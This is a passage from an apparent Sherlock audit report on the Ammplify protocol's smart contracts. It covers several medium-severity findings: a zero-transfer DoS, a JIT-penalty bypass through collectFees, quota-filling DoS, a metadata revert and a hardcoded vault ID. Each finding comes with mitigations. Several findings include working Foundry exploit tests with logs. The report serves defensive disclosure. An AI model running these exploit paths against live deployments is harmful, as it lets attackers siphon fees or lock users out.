function to complete.\r\n\r\nRoot Cause\r\nNo amount > 0 check when transferring tokens in PoolFacet.sol#uniswapV3MintCallback().\r\n\r\nhttps://github.com/sherlock-audit/2025-09-ammplify/blob/main/Ammplify/src/facets/Pool.sol#L20-L21\r\n\r\nInternal Pre-conditions\r\nOne of the pool tokens must be a revert on amount 0 token.\r\nExternal Pre-conditions\r\nThe Revert on Zero Value Transfers token must return a 0 amount from the UniswapV3Pool.sol#mint() callback function for the given tick range.\r\nAttack Path\r\nCreate a Uniswap pool where 1 of the tokens is a Revert on Zero Value Transfers Token.\r\nCall any function that calls the PoolWalker.sol#settle() function for a tick range where the uniswap mint callback function will return 0.\r\nRevert when TransferHelper.safeTransfer(pInfo.token, activeMint, amountOwed); is called.\r\nImpact\r\nDoS of any operations involving the affected tick range. This means users cannot create/modify/remove/collect fees for the given tick range.\r\n\r\nPoC\r\nNo response\r\n\r\nMitigation\r\nUpdate Pool.sol#uniswapV3MintCallback() to only perform the transfer if amount > 0.\r\n\r\nfunction uniswapV3MintCallback(uint256 amount0Owed, uint256 amount1Owed, bytes calldata) external {  \r\n    address activeMint = PoolLib.poolGuard();  \r\n    require(msg.sender == activeMint, UnauthorizedMint(activeMint, msg.sender));  \r\n    PoolInfo memory pInfo = PoolLib.getPoolInfo(activeMint);  \r\n    if (amount0Owed > 0) {  \r\n        TransferHelper.safeTransfer(pInfo.token0, activeMint, amount0Owed);  \r\n    }  \r\n    if (amount1Owed > 0) {  \r\n        TransferHelper.safeTransfer(pInfo.token1, activeMint, amount1Owed);  \r\n    }  \r\n}  \r\nDiscussion\r\nsherlock-admin2\r\n\r\nThe protocol team fixed this issue in the following PRs/commits:\r\nhttps://github.com/itos-finance/Ammplify/pull/17\r\n\r\nIssue M-2: JIT penalty on fresh fees can be bypassed\r\nSource: https://github.com/sherlock-audit/2025-09-ammplify-judging/issues/3\r\n\r\nFound by\r\n0xHammad, 0xKemah, JeRRy0422, coin2own, djshaneden, drdee, maigadoh, r1ver, t.aksoy, x15\r\n\r\nDescription\r\nCollect path pays without JIT penalty and resets the age. MakerFacet.collectFees computes the owed fees via a full walk, settles them to the user, and then updates the asset timestamp. There is no call to FeeLib.applyJITPenalties on the collected amounts\r\n\r\nfunction collectFees(...) external nonReentrant returns (uint256 fees0, uint256 fees1) {  \r\n    ...  \r\n    Data memory data = DataImpl.make(pInfo, asset, minSqrtPriceX96, maxSqrtPriceX96, asset.liq);  \r\n    WalkerLib.modify(pInfo, asset.lowTick, asset.highTick, data);  \r\n    PoolWalker.settle(pInfo, asset.lowTick, asset.highTick, data);  \r\n  \r\n    // @ Timestamp is reset here  \r\n    AssetLib.updateTimestamp(asset);  \r\n  \r\n    // @ Fees paid directly; no JIT penalty applied  \r\n    int256;  \r\n    balances[0] = data.xBalance;  \r\n    balances[1] = data.yBalance;  \r\n    RFTLib.settle(recipient, tokens, balances, rftData);  \r\n    fees0 = uint256(-data.xBalance);  \r\n    fees1 = uint256(-data.yBalance);  \r\n}  \r\n  \r\nRemove/adjust path does apply the JIT penalty. Both removeMaker and the removal branch in adjustMaker apply the penalty right before paying the user\r\n\r\n// removeMaker  \r\n(removedX, removedY) = FeeLib.applyJITPenalties(asset, removedX, removedY);  \r\n  \r\n// adjustMaker (removal branch)  \r\n(removedX, removedY) = FeeLib.applyJITPenalties(asset, removedX, removedY);  \r\n...  \r\nAssetLib.updateTimestamp(asset);  \r\nThe penalty itself is binary on time. If now - asset.timestamp < jitLifetime, the payout is multiplied by penaltyX64 (a factor < 1). It does not taper with time so resetting the timestamp during collectFees does not help the attacker avoid a time‑based curve; it simply means the next removal remains penalized, as before.\r\n\r\nCrucially, the collected fees avoid any penalty entirely\r\n\r\nfunction applyJITPenalties(Asset storage asset, uint256 xBalance, uint256 yBalance)  \r\n    internal view returns (uint256 xBalanceOut, uint256 yBalanceOut)  \r\n{  \r\n    uint128 duration = uint128(block.timestamp) - asset.timestamp;  \r\n    if (duration >= store.jitLifetime) return (xBalance, yBalance);  \r\n    xBalanceOut = FullMath.mulX64(xBalance, penaltyX64, true);  \r\n    yBalanceOut = FullMath.mulX64(yBalance, penaltyX64, true);  \r\n}  \r\n  \r\nThe NFT wrapper bakes in the bypass. The default burn flow in NFTManager.burnAsset first calls collectFees and only then removeMaker, guaranteeing fees are paid without any JIT penalty even when the position is fresh\r\n\r\n(fees0, fees1) = MAKER_FACET.collectFees(...);  \r\n(token0, token1, removedX, removedY) = MAKER_FACET.removeMaker(...);  \r\n  \r\nLet P = penaltyX64 < 1 and assume the position age is below jitLifetime.\r\n\r\nBaseline (remove only): user receives P * (principal + fees).\r\nExploit (collect → remove): user receives 1 * (fees) + P * (principal).\r\nBecause P < 1, the second path always yields extra fees * (1 − P) with no counter‑balancing loss on the principal (the principal removal is penalized in both paths). This enables classic JIT LPing around expected swaps to siphon fresh fees while the anti‑JIT only bites the base liquidity.\r\n\r\nUnder Sherlock’s rules, this breaks a core property meant to protect against JIT (explicit “JIT penalties” exist, are configurable, and are guarded in other code paths), and leads to a relevant loss to the protocol/takers/other makers in fee distribution.\r\n\r\nNote the code comment in adjustMaker acknowledges this risk (“apply jit afterwards in case someone is trying to use adjust to get around that”), yet the same protection is missing on collectFees\r\n\r\nAttack path\r\n\r\nPreconditions: jitLifetime > 0, penaltyX64 < 1; liquidity just minted (age < jitLifetime); a swap (or taker activity) accrued fees.\r\n\r\nLP provides liquidity for a short window around an anticipated large swap.\r\nImmediately after, call collectFees → all accrued fees are paid in full and the position timestamp is reset to now.\r\nCall removeMaker to exit principal; penalty applies to principal only (same penalty factor as if removed directly), but fees escaped the penalty entirely.\r\nPOC\r\nAdd this test to Maker.t.sol and run forge test --mt testJITPenaltyBypassViaCollectFees -vvvv\r\n\r\nfunction testJITPenaltyBypassViaCollectFees() public {  \r\n        bytes memory rftData = \"\";  \r\n  \r\n        // Configure JIT penalties: 1 hour lifetime, 50% penalty  \r\n        uint64 jitLifetime = 1 hours;  \r\n        uint64 jitPenaltyX64 = 9223372036854775808; // 50% penalty (0.5 * 2^64)  \r\n  \r\n        adminFacet.setJITPenalties(jitLifetime, jitPenaltyX64);  \r\n  \r\n        // Verify JIT penalty configuration  \r\n        (, , , uint64 storedLifetime, uint64 storedPenalty) = adminFacet.getDefaultFeeConfig();  \r\n        assertEq(storedLifetime, jitLifetime, \"JIT lifetime not set correctly\");  \r\n        assertEq(storedPenalty, jitPenaltyX64, \"JIT penalty not set correctly\");  \r\n  \r\n        // Set initial timestamp  \r\n        vm.warp(1000);  \r\n  \r\n        // Create a fresh maker position (will have timestamp = 1000)  \r\n        uint256 assetId = makerFacet.newMaker(  \r\n            recipient,  \r\n            poolAddr,  \r\n            lowTick,  \r\n            highTick,  \r\n            liquidity,  \r\n            false, // non-compounding  \r\n            minSqrtPriceX96,  \r\n            maxSqrtPriceX96,  \r\n            rftData  \r\n        );  \r\n  \r\n        // Generate fees by performing swaps  \r\n        swapTo(0, TickMath.getSqrtRatioAtTick(600));  // Move price up  \r\n        swapTo(0, TickMath.getSqrtRatioAtTick(-600)); // Move price back down  \r\n  \r\n        // Advance time by 30 minutes (less than jitLifetime of 1 hour)  \r\n        vm.warp(1000 + 30 minutes);  \r\n  \r\n        // Mock the asset owner for all subsequent calls  \r\n        vm.startPrank(recipient);  \r\n  \r\n        // === DEMONSTRATE THE VULNERABILITY ===  \r\n  \r\n        // First, let's see what happens with direct removal (baseline)  \r\n        // Query the current balances before any action  \r\n        (int256 initialBalance0, int256 initialBalance1, , ) = viewFacet.queryAssetBalances(assetId);  \r\n  \r\n        // Create a snapshot to restore state  \r\n        uint256 snapshot = vm.snapshot();  \r\n  \r\n        // BASELINE: Direct removal with JIT penalty applied to everything  \r\n        (,, uint256 baselineRemovedX, uint256 baselineRemovedY) = makerFacet.removeMaker(  \r\n            recipient,  \r\n            assetId,  \r\n            minSqrtPriceX96,  \r\n            maxSqrtPriceX96,  \r\n            rftData  \r\n        );  \r\n  \r\n        // Restore state to before removal  \r\n        vm.revertTo(snapshot);  \r\n  \r\n        // EXPLOIT: collectFees first, then removeMaker  \r\n        // Step 1: Collect fees (bypasses JIT penalty and resets timestamp)  \r\n        (uint256 exploitFees0, uint256 exploitFees1) = makerFacet.collectFees(  \r\n            recipient,  \r\n            assetId,  \r\n            minSqrtPriceX96,  \r\n            maxSqrtPriceX96,  \r\n            rftData  \r\n        );  \r\n  \r\n        // Step 2: Remove maker (JIT penalty only applies to remaining principal)  \r\n        (,, uint256 exploitRemovedX, uint256 exploitRemovedY) = makerFacet.removeMaker(  \r\n            recipient,  \r\n            assetId,  \r\n            minSqrtPriceX96,  \r\n            maxSqrtPriceX96,  \r\n            rftData  \r\n        );  \r\n  \r\n        vm.stopPrank();  \r\n  \r\n        // === VULNERABILITY VERIFICATION ===  \r\n  \r\n        // Calculate total received in each scenario  \r\n        uint256 exploitTotalX = exploitFees0 + exploitRemovedX;  \r\n        uint256 exploitTotalY = exploitFees1 + exploitRemovedY;  \r\n  \r\n        // Verify that the exploit path yields more tokens than baseline  \r\n        assertGt(exploitTotalX, baselineRemovedX, \"Exploit should yield more token0 than baseline\");  \r\n        assertGt(exploitTotalY, baselineRemovedY, \"Exploit should yield more token1 than baseline\");  \r\n  \r\n        // Calculate the extra tokens gained through the exploit  \r\n        uint256 extraX = exploitTotalX - baselineRemovedX;  \r\n        uint256 extraY = exploitTotalY - baselineRemovedY;  \r\n  \r\n        // Verify that fees were actually collected (non-zero)  \r\n        assertGt(exploitFees0, 0, \"Should have collected non-zero fees0\");  \r\n        assertGt(exploitFees1, 0, \"Should have collected non-zero fees1\");  \r\n  \r\n        // The extra amount should be approximately fees * (1 - penaltyFactor)  \r\n        // Since penaltyFactor = 0.5, we expect extra ≈ fees * 0.5  \r\n        uint256 expectedExtraX = exploitFees0 / 2; // 50% of fees  \r\n        uint256 expectedExtraY = exploitFees1 / 2; // 50% of fees  \r\n  \r\n        // Allow for some rounding tolerance (10% tolerance due to complex fee calculations)  \r\n        if (expectedExtraX > 0) {  \r\n            assertApproxEqRel(extraX, expectedExtraX, 0.1e18, \"Extra X should be ~50% of fees\");  \r\n        }  \r\n        if (expectedExtraY > 0) {  \r\n            assertApproxEqRel(extraY, expectedExtraY, 0.1e18, \"Extra Y should be ~50% of fees\");  \r\n        }  \r\n  \r\n        // Log the results for visibility  \r\n        emit log_named_uint(\"Initial Balance0\", uint256(initialBalance0));  \r\n        emit log_named_uint(\"Initial Balance1\", uint256(initialBalance1));  \r\n        emit log_named_uint(\"Baseline Removed X\", baselineRemovedX);  \r\n        emit log_named_uint(\"Baseline Removed Y\", baselineRemovedY);  \r\n        emit log_named_uint(\"Exploit Fees0\", exploitFees0);  \r\n        emit log_named_uint(\"Exploit Fees1\", exploitFees1);  \r\n        emit log_named_uint(\"Exploit Removed X\", exploitRemovedX);  \r\n        emit log_named_uint(\"Exploit Removed Y\", exploitRemovedY);  \r\n        emit log_named_uint(\"Exploit Total X\", exploitTotalX);  \r\n        emit log_named_uint(\"Exploit Total Y\", exploitTotalY);  \r\n        emit log_named_uint(\"Extra X Gained\", extraX);  \r\n        emit log_named_uint(\"Extra Y Gained\", extraY);  \r\n  \r\n    }  \r\nLogs\r\n\r\nLogs:  \r\n  Initial Balance0: 6000599925504992682  \r\n  Initial Balance1: 0  \r\n  Baseline Removed X: 3009327946592273158  \r\n  Baseline Removed Y: 4581693336396101  \r\n  Exploit Fees0: 18055967679553633  \r\n  Exploit Fees1: 9163386672792201  \r\n  Exploit Removed X: 3000299962752496341  \r\n  Exploit Removed Y: 0  \r\n  Exploit Total X: 3018355930432049974  \r\n  Exploit Total Y: 9163386672792201  \r\n  Extra X Gained: 9027983839776816  \r\n  Extra Y Gained: 4581693336396100  \r\nRecommendation\r\nApply the JIT penalty inside collectFees before settlement, then update the timestamp. Also update NFTManager.burnAsset if you want to keep the “collect then remove” ordering once collectFees penalizes, the flow is safe.\r\n\r\nIf you prefer not to penalize collect don’t reset asset.timestamp on collectFees. Only update timestamps on liquidity‑changing actions. That won’t fix the core bypass (fees still unpenalized), but it avoids further gaming of the penalty window\r\n\r\nDiscussion\r\nsherlock-admin2\r\n\r\nThe protocol team fixed this issue in the following PRs/commits:\r\nhttps://github.com/itos-finance/Ammplify/pull/18\r\n\r\nIssue M-3: An attacker can block a user from opening new Maker/Taker positions by “donating” 16 unwanted Maker assets, saturating their asset quota\r\nSource: https://github.com/sherlock-audit/2025-09-ammplify-judging/issues/20\r\n\r\nFound by\r\n0xAsen, 0xCuru, 0xKemah, 0xSecurious, 0xaxaxa, 0xnija, 8olidity, ADM_, JasonBPMIASN, KiroBrejka, KlosMitSoss, Kodyvim, OxNoble, P00, SOPROBRO, Slayer, TheSavageTeddy, anonymousjoe, blockace, drdee, fullstop, har0507, merlin, mingzoox, neeloy, sakibcy, serenity1337, sourav_DEV, t.aksoy\r\n\r\nSummary\r\nBecause assets created via newMaker(recipient=...) are added directly to the recipient’s quota without their consent or opt-in, an attacker can fill a user’s MAX_ASSETS_PER_OWNER = 16 slots. This results in a functional denial-of-service: the user is prevented from ever opening any Maker or Taker position until they remove those unwanted assets. This blocks core protocol functionality for an extended period.\r\n\r\nRoot Cause\r\nUnfettered use of recipient in newMaker, adding assets to someone else’s quota without permission:\r\nsrc/facet/MakerFacet.newMaker():20 -> src/facet/MakerFacet.newMaker():32 -> src/Asset.newMaker():64-73\r\n\r\nShared global cap for Maker + Taker per owner without opt-in:\r\nsrc/Asset.MAX_ASSETS_PER_OWNER:44 -> src/Asset.addAssetToOwner():139-147\r\n\r\nMaker and Taker share the same mapping and cap:\r\nsrc/Asset.newTaker():76-111\r\n\r\nInternal Pre-conditions\r\nAttacker can call newMaker(recipient=victim) freely.\r\n\r\nAttacker supplies minimal liquidity to satisfy requirements.\r\n\r\nExternal Pre-conditions\r\nNone\r\n\r\nAttack Path\r\nAttacker calls newMaker(recipient=victim, ...) 16 times, filling the asset quota.\r\nVictim attempts to call newMaker(...) or newTaker(...), but call reverts with ExcessiveAssetsPerOwner.\r\nImpact\r\nComplete DoS of Maker/Taker creation for target users.\r\nIf the victim does nothing (or cannot act), the block persists indefinitely → long-lasting.\r\nDisrupts time-sensitive core functionality: inability to provide liquidity or collect fees.\r\nEasily automatable/spammable by attacker; very low cost.\r\nPoC\r\n// SPDX-License-Identifier: UNLICENSED  \r\npragma solidity ^0.8.28;  \r\n  \r\nimport {Test} from \"forge-std/Test.sol\";  \r\nimport {console2} from \"forge-std/console2.sol\";  \r\nimport {MultiSetupTest} from \"../MultiSetup.u.sol\";  \r\nimport {MockERC20} from \"../mocks/MockERC20.sol\";  \r\n  \r\ninterface IUniV3PoolLike {  \r\n    function token0() external view returns (address);  \r\n    function token1() external view returns (address);  \r\n    function tickSpacing() external view returns (int24);  \r\n    function slot0() external view returns (uint160,int24,uint16,uint16,uint16,uint8,bool);  \r\n    function ticks(int24) external view returns (uint128,int128,uint256,uint256,int56,uint160,uint32,bool);  \r\n    function observations(uint256) external view returns (uint32,int56,uint160,bool);  \r\n    function mint(address owner,int24 tickLower,int24 tickUpper,uint128 amount,bytes calldata data)  \r\n        external returns (uint256 amount0, uint256 amount1);  \r\n    function burn(int24 tickLower,int24 tickUpper,uint128 amount)  \r\n        external returns (uint256 amount0, uint256 amount1);  \r\n    function collect(address recipient,int24 tickLower,int24 tickUpper,uint128 amount0Requested,uint128 amount1Requested)  \r\n        external returns (uint128 amount0, uint128 amount1);  \r\n}  \r\n  \r\n// Fake pool \"neutre\" : appelle la callback avec (0,0) et ne rend rien au burn/collect.  \r\n// Cela suffit pour que `newMaker` aboutisse sans drainer le Diamond.  \r\ncontract FakePoolNeutral is IUniV3PoolLike {  \r\n    address public immutable t0;  \r\n    address public immutable t1;  \r\n    address public immutable diamond;  \r\n  \r\n    constructor(address _t0, address _t1, address _diamond) {  \r\n        t0 = _t0; t1 = _t1; diamond = _diamond;  \r\n    }  \r\n  \r\n    function token0() external view returns (address) { return t0; }  \r\n    function token1() external view returns (address) { return t1; }  \r\n    function tickSpacing() external pure returns (int24) { return 60; }  \r\n    function slot0() external pure returns (uint160,int24,uint16,uint16,uint16,uint8,bool) {  \r\n        return (uint160(1<<96), 0, 0, 0, 0, 0, true);  \r\n    }  \r\n    function ticks(int24) external pure returns (uint128,int128,uint256,uint256,int56,uint160,uint32,bool) {  \r\n        return (0,0,0,0,0,0,0,false);  \r\n    }  \r\n    function observations(uint256) external pure returns (uint32,int56,uint160,bool) {  \r\n        return (0,0,0,true);  \r\n    }  \r\n    function feeGrowthGlobal0X128() external pure returns (uint256) { return 0; }  \r\n    function feeGrowthGlobal1X128() external pure returns (uint256) { return 0; }  \r\n    function positions(bytes32 /*key*/) external view returns (  \r\n        uint128, uint256, uint256, uint128, uint128  \r\n    ) {  \r\n        // Ajuste ces valeurs si ta logique dépend d’un état particulier.  \r\n        return (0, 0, 0, 0, 0);  \r\n    }  \r\n    function mint(address, int24, int24, uint128, bytes calldata)  \r\n        external returns (uint256 amount0, uint256 amount1)  \r\n    {  \r\n        // Callback avec zero → aucune sortie de fonds  \r\n        (bool ok,) = diamond.call(  \r\n            abi.encodeWithSignature(  \r\n                \"uniswapV3MintCallback(uint256,uint256,bytes)\",  \r\n                0, 0, \"\"  \r\n            )  \r\n        );  \r\n        require(ok, \"callback failed\");  \r\n        return (0, 0);  \r\n    }  \r\n  \r\n    function burn(int24, int24, uint128) external pure returns (uint256, uint256) {  \r\n        return (0, 0);  \r\n    }  \r\n    function collect(address, int24, int24, uint128, uint128) external pure returns (uint128, uint128) {  \r\n        return (0, 0);  \r\n    }  \r\n}  \r\n  \r\ncontract C4Test is MultiSetupTest {  \r\n    FakePoolNeutral fake;  \r\n  \r\n    int24 constant LOW  = -600;  \r\n    int24 constant HIGH =  600;  \r\n  \r\n    // même valeur que MakerFacet.MIN_MAKER_LIQUIDITY  \r\n    uint128 constant MIN_LIQ = 1_000_000;  \r\n  \r\n    address victim;  \r\n  \r\n    function setUp() public {  \r\n        _newDiamond();  \r\n  \r\n        token0 = new MockERC20(\"T0\",\"T0\",18);  \r\n        token1 = new MockERC20(\"T1\",\"T1\",18);  \r\n  \r\n        // Trésorerie Diamond (inutile ici mais garde la symétrie)  \r\n        token0.mint(diamond, 1e18);  \r\n        token1.mint(diamond, 1e18);  \r\n  \r\n        // Attaquant (address(this)) a de quoi payer si `RFTLib.settle` demande  \r\n        token0.mint(address(this), 1e24);  \r\n        token1.mint(address(this), 1e24);  \r\n        token0.approve(diamond, type(uint256).max);  \r\n        token1.approve(diamond, type(uint256).max);  \r\n  \r\n        // Victime  \r\n        victim = address(0xBEEF);  \r\n        token0.mint(victim, 1e24);  \r\n        token1.mint(victim, 1e24);  \r\n        // Approvals de la victime (pour sa tentative finale)  \r\n        vm.startPrank(victim);  \r\n        token0.approve(diamond, type(uint256).max);  \r\n        token1.approve(diamond, type(uint256).max);  \r\n        vm.stopPrank();  \r\n  \r\n        // Fake pool \"neutre\"  \r\n        fake = new FakePoolNeutral(address(token0), address(token1), diamond);  \r\n    }  \r\n  \r\n    function test_DoS_MakerDonationCap16() public {  \r\n        // 1) L’attaquant spam 16 Maker \"offerts\" à la victime  \r\n        for (uint256 i = 0; i < 16; i++) {  \r\n            makerFacet.newMaker(  \r\n                victim,             // ← owner imposé  \r\n                address(fake),  \r\n                LOW, HIGH,  \r\n                MIN_LIQ,            // minimum protocolaire  \r\n                true,  \r\n                1,  \r\n                type(uint160).max,  \r\n                \"\"  \r\n            );  \r\n        }  \r\n  \r\n        // 2) La victime essaie d’ouvrir sa propre position → revert (cap atteint)  \r\n        vm.startPrank(victim);  \r\n        makerFacet.newMaker(  \r\n            victim,  \r\n            address(fake),  \r\n            LOW, HIGH,  \r\n            MIN_LIQ,  \r\n            true,  \r\n            1,  \r\n            type(uint160).max,  \r\n            \"\"  \r\n        );  \r\n        vm.stopPrank();  \r\n    }  \r\n}  \r\n  \r\nMitigation\r\nRequire explicit recipient consent/opt-in before adding assets to their account.\r\nRestrict newMaker to recipient == msg.sender and implement explicit transfer with acceptance.\r\nSeparate Maker/Taker quotas.\r\nAdd a free “clean-up” function for unwanted assets.\r\n\r\nDiscussion\r\nsherlock-admin2\r\n\r\nThe protocol team fixed this issue in the following PRs/commits:\r\nhttps://github.com/itos-finance/Ammplify/pull/19\r\n\r\nIssue M-4: NFTManager will break NFT metadata for users as tokenURI() will revert\r\nSource: https://github.com/sherlock-audit/2025-09-ammplify-judging/issues/94\r\n\r\nFound by\r\n0xAsen, 8olidity, JeRRy0422, OxNoble, Sa1ntRobi, axelot, befree3x, drdee, fullstop, glitch-Hunter, jayjoshix, kimnoic, soloking, thimthor, veerendravamshi, vivekd, vtim\r\n\r\nSummary\r\nThe use of AssetLib.getAsset inside NFTManager._generateMetadata/_generateSVG will cause a revert for users requesting NFT metadata, as NFTManager will read diamond storage directly and always see asset.owner == address(0).\r\n\r\nRoot Cause\r\nIn NFTManager.sol:_generateMetadata, the call to AssetLib.getAsset(assetId) reads from Store.assets() (diamond storage). Since the call originates from NFTManager, it resolves against the ERC721’s own storage instead of the diamond’s, making every asset appear unset.\r\n\r\nInternal Pre-conditions\r\nA user must have minted a position through NFTManager.mintNewMaker.\r\n\r\nThe user (or marketplace) calls NFTManager.tokenURI(tokenId) to query metadata.\r\n\r\nExternal Pre-conditions\r\nNone.\r\n\r\nAttack Path\r\nUser calls NFTManager.mintNewMaker → NFT minted successfully, mappings updated.\r\n\r\nAny party calls NFTManager.tokenURI(tokenId) → _generateMetadata calls AssetLib.getAsset(assetId).\r\n\r\nAssetLib resolves Store.assets() against NFTManager storage, not the diamond.\r\n\r\nasset.owner == address(0) → require fails → transaction reverts.\r\n\r\nImpact\r\nThe users cannot retrieve NFT metadata. As a result, wallets, explorers, and marketplaces cannot display Ammplify NFTs, effectively breaking NFT usability. This makes minted NFTs indistinguishable and practically unusable in external integrations.\r\n\r\nPoC\r\nNo response\r\n\r\nMitigation\r\nRefactor _generateMetadata and _generateSVG to avoid AssetLib. Fetch asset data through the IView facet (getAssetInfo and getPoolInfo) as already done in positions().\r\n\r\nDiscussion\r\nsherlock-admin2\r\n\r\nThe protocol team fixed this issue in the following PRs/commits:\r\nhttps://github.com/itos-finance/Ammplify/pull/36\r\n\r\nIssue M-5: transferVaultBalance function is unusable and mistransfers user's funds due to hardcoded asset ID\r\nSource: https://github.com/sherlock-audit/2025-09-ammplify-judging/issues/133\r\n\r\nFound by\r\n0xpinkman, 8olidity, ARMoh, CasinoCompiler, DSbeX, KlosMitSoss, Mishkat6451, Motomoto, Razkky, Sa1ntRobi, Slayer, TheSavageTeddy, _Ranjan2003, aster, holtzzx, jayjoshix, panprog, r1ver, rubencrxz, tedox, tinnohofficial, uuzall, volleyking, vtim, yungjoky\r\n\r\nSummary\r\nThe admin migration tool uses a hardcoded id (80085) when moving balances between vaults, so it targets a single arbitrary account instead of user's real assetIds.\r\nBecause balances are accounted per position assetId elsewhere, the migration withdraw for id 80085 usually finds no shares and the entire admin call reverts.\r\nassetId will eventually collide with the hardcoded value, and when it does, this flaw will escalate to a vector for direct, unintentional theft of user funds.\r\n\r\nRoot Cause\r\nAdminFacet.transferVaultBalance imports TAKER_VAULT_ID and calls VaultLib.transfer(fromVault, toVault, TAKER_VAULT_ID, amount), forcing both withdraw and deposit to run against id 80085.\r\n\r\nhttps://github.com/sherlock-audit/2025-09-ammplify/blob/main/Ammplify/src/facets/Admin.sol#L133\r\nhttps://github.com/sherlock-audit/2025-09-ammplify/blob/main/Ammplify/src/facets/Taker.sol#L18\r\n\r\nThe system’s taker and view flows key balances by each position’s assetId, so the migration’s single‑id pathway is incompatible with the storage model.\r\n\r\nInternal Pre-conditions\r\nNil\r\n\r\nExternal Pre-conditions\r\nNil\r\n\r\nAttack Path\r\nRegister an active and a backup ERC4626 vault for a token via AdminFacet.addVault so there is a source and destination vault to migrate between.\r\nCall AdminFacet.transferVaultBalance(fromVault, toVault, amount) with any nonzero amount to initiate migration.\r\nThe function imports TAKER_VAULT_ID and forwards it to VaultLib.transfer as the userId, so the library executes withdraw(userId=80085, amount) from the source vault and then tries to deposit the same id into the destination.\r\nBecause balances are tracked per real position assetId , userId 80085 typically has zero shares, withdraw fails, and the whole transaction reverts.\r\nAlso, this assetId will eventually collide with the hardcoded value, and when it does, this flaw will escalate to a vector for direct, unintentional theft of user funds.\r\nImpact\r\nThe admin's vault migration function is non-functional. Because it targets a single, hardcoded assetId instead of actual user balances, any attempt to perform a vault rotation or emergency migration will revert.\r\n\r\nAs the protocol assigns assetIds sequentially, a user position will inevitably be assigned the hardcoded ID. At that point, the same administrative function will unintentionally move that specific user's funds, creating a direct risk of non-consensual fund movement and asset misappropriation.\r\n\r\nPoC\r\n// SPDX-License-Identifier: UNLICENSED  \r\npragma solidity ^0.8.27;  \r\n  \r\nimport { ERC20 } from \"a@openzeppelin/contracts/token/ERC20/ERC20.sol\";  \r\nimport { VaultType } from \"src/vaults/Vault.sol\";  \r\nimport { MultiSetupTest } from \"test/MultiSetup.u.sol\";  \r\nimport { MockERC20 } from \"test/mocks/MockERC20.sol\";  \r\nimport { MockERC4626 } from \"test/mocks/MockERC4626.sol\";  \r\n  \r\ncontract PoC_Migration is MultiSetupTest {  \r\n    MockERC20 private mockToken;  \r\n    MockERC4626 private activeVault;  \r\n    MockERC4626 private backupVault;  \r\n  \r\n    function setUp() public {  \r\n        _newDiamond(); // deploys diamond and facets (adminFacet available) [MultiSetup.u.sol]  \r\n        mockToken   = new MockERC20(\"Mock\", \"MOCK\", 18);  \r\n        activeVault = new MockERC4626(ERC20(address(mockToken)), \"Active\", \"ACT\");  \r\n        backupVault = new MockERC4626(ERC20(address(mockToken)), \"Backup\", \"BKP\");  \r\n  \r\n        // Register active and backup vaults for token at index 0 [Admin.sol]  \r\n        adminFacet.addVault(address(mockToken), 0, address(activeVault), VaultType.E4626);  \r\n        adminFacet.addVault(address(mockToken), 0, address(backupVault), VaultType.E4626);  \r\n    }  \r\n  \r\n    function test_transferVaultBalance_reverts_when80085HasNoShares() public {  \r\n        // Because AdminFacet.transferVaultBalance hardcodes TAKER_VAULT_ID=80085, and 80085 has no shares,  \r\n        // withdrawing on that id reverts during VaultLib.transfer [Admin.sol][Vault.sol].  \r\n        uint256 amount = 1e6;  \r\n        vm.expectRevert();  \r\n        adminFacet.transferVaultBalance(address(activeVault), address(backupVault), amount);  \r\n    }  \r\n}  \r\nResult:\r\n\r\nRan 1 test for test/POC.t.sol:PoC_Migration  \r\n[PASS] test_transferVaultBalance_reverts_when80085HasNoShares() (gas: 46446)  \r\nTraces:  \r\n  [46446] PoC_Migration::test_transferVaultBalance_reverts_when80085HasNoShares()  \r\n    ├─ [0] VM::expectRevert(custom error 0xf4844814)  \r\n    │   └─ ← [Return]  \r\n    ├─ [33679] SimplexDiamond::fallback(MockERC4626: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], MockERC4626: [0xc7183455a4C133Ae270771860664b6B7ec320bB1], 1000000 [1e6])  \r\n    │   ├─ [28765] AdminFacet::transferVaultBalance(MockERC4626: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], MockERC4626: [0xc7183455a4C133Ae270771860664b6B7ec320bB1], 1000000 [1e6]) [delegatecall]  \r\n    │   │   ├─ [8308] MockERC4626::previewRedeem(0) [staticcall]  \r\n    │   │   │   ├─ [2484] MockERC20::balanceOf(MockERC4626: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9]) [staticcall]  \r\n    │   │   │   │   └─ ← [Return] 0  \r\n    │   │   │   └─ ← [Return] 0  \r\n    │   │   ├─ [2135] MockERC4626::previewDeposit(340282366920938463463374607431768211456 [3.402e38]) [staticcall]  \r\n    │   │   │   ├─ [484] MockERC20::balanceOf(MockERC4626: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9]) [staticcall]  \r\n    │   │   │   │   └─ ← [Return] 0  \r\n    │   │   │   └─ ← [Return] 340282366920938463463374607431768211456 [3.402e38]  \r\n    │   │   ├─ [1808] MockERC4626::previewRedeem(340282366920938463463374607431768211456 [3.402e38]) [staticcall]  \r\n    │   │   │   ├─ [484] MockERC20::balanceOf(MockERC4626: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9]) [staticcall]  \r\n    │   │   │   │   └─ ← [Return] 0  \r\n    │   │   │   └─ ← [Return] 340282366920938463463374607431768211456 [3.402e38]  \r\n    │   │   └─ ← [Revert] EvmError: Revert  \r\n    │   └─ ← [Revert] EvmError: Revert  \r\n    └─ ← [Return]  \r\n  \r\nSuite result: ok. 1 passed; 0 failed; 0 skipped; finished in 49.29ms (7.15ms CPU time)  \r\nMitigation\r\nThe AdminFacet.transferVaultBalance function is fundamentally flawed and should be removed entirely.\r\nFor vault migrations and upgrades, the protocol should exclusively use the existing VaultLib.hotSwap mechanism. This \"hot-swap\" or \"lazy migration\" approach is safer as it avoids direct, per-user fund transfers and eliminates both the Denial of Service and the fund-hijack risks.\r\nThe assetId 80085 should be explicitly reserved in the asset creation logic to prevent it from ever being assigned to a user, eliminating any future ID collision risk.\r\nDiscussion\r\nsherlock-admin2\r\n\r\nThe protocol team fixed this issue in the following PRs/commits:\r\nhttps://github.com/itos-finance/Ammplify/pull/37\r\n\r\nIssue M-6: Pending Owner cannot accept ownership because of wrong implementation of transferOwnership and acceptOwnership functions\r\nSource: https://github.com/sherlock-audit/2025-09-ammplify-judging/issues/183\r\n\r\nFound by\r\n0xnija, SoarinSkySagar, neeloy, thimthor, v_2110\r\n\r\nSummary\r\nWhen admin(owner) try to transfer ownership, pending owner is unable to accept ownership even after the required delay has elapsed because of wrong implementation of transferOwnership and acceptOwnership functions in TimedAdminFacet which is the 